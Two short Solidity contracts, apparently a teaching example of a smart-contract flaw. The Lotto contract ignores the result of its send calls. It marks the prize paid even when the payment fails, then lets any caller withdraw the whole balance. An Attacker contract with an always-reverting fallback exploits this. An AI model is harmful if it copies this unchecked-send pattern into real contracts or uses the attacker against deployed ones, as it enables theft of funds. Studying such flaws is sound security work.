pragma solidity ^0.6.4;

contract Lotto {

    bool public payedOut = false;
    address payable public winner;
    uint public winAmount;


    function sendToWinner() public {
        require(!payedOut);
        winner.send(winAmount);
        payedOut = true;
    }

    function withdrawLeftOver() public {
        require(payedOut);
        msg.sender.send(address(this).balance);
    }
}

pragma solidity ^0.6.4;
import "/Lotto.sol";

contract Attacker {
    
    Lotto lt;
    
    fallback() external {
        revert();
    }
    
    function callSendToWinner(address target) external {
        lt = Lotto(target);
        lt.sendToWinner(); 
    }
}